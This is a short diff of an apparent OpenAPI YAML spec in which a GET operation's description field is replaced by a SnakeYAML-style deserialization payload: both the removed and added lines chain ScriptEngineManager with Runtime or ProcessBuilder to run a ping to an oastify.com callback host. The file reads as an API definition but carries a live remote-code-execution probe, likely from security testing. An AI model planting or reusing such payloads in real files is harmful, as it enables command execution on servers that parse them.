@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.lang.Runtime [[!!java.lang.exec [ping 4bg8aoxflquupncrfjwdzldeh5nxbtzi.oastify.com]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.lang.ProcessBuilder [[!!java.lang.command [ping tmjxld84wf5j0cngq872aao3suymmka9.oastify.com]]]]
       produces:
       - application/json
       responses:
